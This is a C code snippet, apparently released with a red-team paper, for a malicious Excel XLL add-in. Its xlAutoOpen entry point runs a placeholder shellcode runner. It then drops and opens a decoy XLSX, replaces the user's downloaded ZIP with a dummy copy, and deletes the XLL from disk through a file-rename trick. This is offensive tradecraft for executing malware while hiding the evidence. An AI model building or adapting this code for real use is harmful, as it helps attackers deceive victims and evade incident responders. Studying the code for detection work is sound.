//This is an example code snippet for the XLL/XLSX manipulation detailed in this paper.
//This snippet was not written to be able to compile on its own, you will need to take and modify the code to suit your needs.

//Byte array containing xlsx spreadsheet to be dropped in appdata\local\temp
BYTE xlsx[1] = {0xFF};

//Byte array containing second zip folder with the same folder, but the xlsx spreadsheet instead of the XLL.  To replace original zip.
BYTE zipfile[1] = {0xFF};

//Runner function.  Your shellcode runner here
void Runner()
{
  //Stuff 
}

//Self-Deletion function
void deleteme()
{
    WCHAR wcPath[MAX_PATH + 1];
    RtlSecureZeroMemory(wcPath, sizeof(wcPath));
    HMODULE hm = NULL;

    //Get Handle to our DLL based on Runner() function
    GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)Runner, &hm);

    //Get path of our DLL
    GetModuleFileNameW(hm, wcPath, sizeof(wcPath));

    //Close handle to our DLL
    CloseHandle(hm);

    //Open handle to DLL with delete flag
    HANDLE hCurrent = CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // rename the associated HANDLE's file name
    FILE_RENAME_INFO* fRename;
    LPWSTR lpwStream = L":myname";
    DWORD bslpwStream = (wcslen(lpwStream)) * sizeof(WCHAR);

    DWORD bsfRename = sizeof(FILE_RENAME_INFO) + bslpwStream;
    fRename = (FILE_RENAME_INFO*)malloc(bsfRename);
    memset(fRename, 0, bsfRename);
    fRename->FileNameLength = bslpwStream;
    memcpy(fRename->FileName, lpwStream, bslpwStream);
    SetFileInformationByHandle(hCurrent, FileRenameInfo, fRename, bsfRename);
    CloseHandle(hCurrent);

    // open another handle, trigger deletion on close
    hCurrent = CreateFileW(wcPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    // set FILE_DISPOSITION_INFO::DeleteFile to TRUE
    FILE_DISPOSITION_INFO fDelete;
    RtlSecureZeroMemory(&fDelete, sizeof(fDelete));
    fDelete.DeleteFile = TRUE;
    SetFileInformationByHandle(hCurrent, FileDispositionInfo, &fDelete, sizeof(fDelete));

    // trigger the deletion deposition on hCurrent
    CloseHandle(hCurrent);
}

//Function to perform XLL/XLSX manipulation
void SpawnXlsx()
{
    //--------------------------------Get path of XLL--------------------------------------------
    WCHAR xllPath[MAX_PATH];
    RtlSecureZeroMemory(xllPath, sizeof(xllPath));
    HMODULE hm = NULL;
    //Get Handle to our XLL based on Runner() function
    GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)Runner, &hm);
    //Get path
    GetModuleFileNameW(hm, xllPath, sizeof(xllPath));

    //-------------------------replace xll filename with xlsx filename----------------------------
    WCHAR* pos;
    int index = 0;
    int owlen;
    WCHAR xllFileName[] = L"importantdoc.xll";
    WCHAR xlsxFileName[] = L"importantdoc.xlsx";

    owlen = wcslen(xllFileName);

    // Fix: If oldWord and newWord are same it goes to infinite loop
    if (!wcscmp(xllFileName, xlsxFileName))
    {
        return;
    }
    pos = wcsstr(xllPath, xllFileName);
    // Index of current found word
    index = pos - xllPath;

    // Terminate str after word found index
    xllPath[index] = L'\0';
  
    // Concatenate str with new word 
    wcscat(xllPath, xlsxFileName);

    //------------------------------Write XLSX to disk------------------------------------------
    DWORD       dwBytesWritten = 0;
    HANDLE		hFile = NULL;

    hFile = CreateFileW(xllPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, xlsx, sizeof(xlsx), &dwBytesWritten, NULL);
    CloseHandle(hFile);

    //--------------------------------Get Excel location----------------------------------------
    WCHAR szFileName[MAX_PATH];
    GetModuleFileNameW(NULL, szFileName, MAX_PATH);

    //---------------------combine excel location with xlsx location----------------------------
    WCHAR cmdArgs[510];
    swprintf_s(cmdArgs, MAX_PATH, L"%ls %ls", szFileName, xllPath);

    //--------------------------------------Spawn XLSX------------------------------------------

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    CreateProcessW(NULL, cmdArgs, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    //---------------------------Find and set path for dummy zip file---------------------------
    WCHAR zipPath[MAX_PATH];
    WCHAR envVarName[] = L"HOMEPATH";
    WCHAR downloads[] = L"\\Downloads\\ZIPFILENAME";

    //Get home dir of user
    GetEnvironmentVariableW(envVarName, zipPath, MAX_PATH);

    // Concatenate str with new word 
    wcscat(zipPath, downloads);
    
    //--------Try to delete original zip file.  If successful, write dummy zip in it's place--------
    if(DeleteFileW(zipPath))
    {
        hFile = CreateFileW(zipPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        WriteFile(hFile, zipfile, sizeof(zipfile), &dwBytesWritten, NULL);
        CloseHandle(hFile);
    }

    //Delete XLL in appdata\local\temp directory
    deleteme();
}

int xlAutoOpen()
{
    Runner();
    SpawnXlsx();
    return 0;
}
